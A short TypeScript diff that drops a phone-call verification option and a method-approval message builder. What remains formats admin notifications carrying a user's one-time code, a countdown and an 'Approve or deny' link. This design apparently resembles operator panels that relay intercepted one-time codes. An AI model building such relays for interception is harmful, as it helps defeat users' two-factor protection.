@@ -51,7 +51,6 @@ export function methodEmoji(method?: string): string {
   const m = String(method ?? "").toLowerCase()
   if (m === "email") return "📧"
   if (m === "text" || m === "sms") return "📱"
-  if (m === "call") return "📞"
   return "📧"
 }
 
@@ -85,7 +84,6 @@ export function methodLabel(method?: string): string | null {
   if (!value || value === "—" || value === "-") return null
   if (value === "email") return "Email"
   if (value === "text" || value === "sms") return "Text Message (SMS)"
-  if (value === "call") return "Phone Call"
   return value
 }
 
@@ -155,28 +153,6 @@ export function buildOtpApprovalRequestBody(data: {
     formatIdentifierLine(data.userId, data.asCode),
     `🔢 Code: ${data.asCode(data.code)}`,
     optionalDatabaseLine(data.databaseShard, data.asCode).replace(/\n$/, ""),
-    optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
-    "",
-    `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
-  ]
-    .filter((line, index, arr) => line !== "" || (index > 0 && arr[index - 1] !== ""))
-    .join("\n")
-    .replace(/\n{3,}/g, "\n\n")
-}
-
-export function buildMethodApprovalRequestBody(data: {
-  userId: string
-  method: string
-  adminLink: string
-  secondsLeft?: number
-  asCode: CodeFn
-  asLink: LinkFn
-}): string {
-  return [
-    "🔔 Verification method selected – approve or deny",
-    "━━━━━━━━━━━━━━━━━━",
-    formatIdentifierLine(data.userId, data.asCode),
-    optionalMethodLine(data.method, data.asCode).replace(/\n$/, ""),
     optionalCountdownLine(data.secondsLeft, data.asCode).replace(/\n$/, ""),
     "",
     `👉 ${data.asLink(data.adminLink, "Approve or deny")}`,
